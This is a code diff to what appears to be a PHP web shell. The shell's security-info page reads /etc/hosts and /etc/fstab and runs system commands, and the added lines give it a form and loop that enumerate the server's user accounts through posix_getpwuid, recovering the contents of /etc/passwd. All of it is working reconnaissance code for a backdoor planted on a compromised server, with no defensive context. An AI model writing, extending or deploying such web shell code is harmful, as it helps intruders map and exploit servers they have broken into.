@@ -365,7 +365,18 @@ function actionSecInfo() {
 			showSecParam('Hosts', @file_get_contents('/etc/hosts'));
 			showSecParam('HDD space', ex('df -h'));
 			showSecParam('Mount options', @file_get_contents('/etc/fstab'));
-		}
+                echo '<br/><span>posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form>';
+                if (isset ($_POST['p2'], $_POST['p3']) && is_numeric($_POST['p2']) && is_numeric($_POST['p3'])) {
+                    $temp = "";
+                    for(;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) {
+                        $uid = @posix_getpwuid($_POST['p2']);
+                        if ($uid)
+                            $temp .= join(':',$uid)."\n";
+                    }
+                    echo '<br/>';
+                    showSecParam('Users', $temp);
+                }
+            }
 	} else {
 		showSecParam('OS Version',ex('ver')); 
 		showSecParam('Account Settings',ex('net accounts')); 
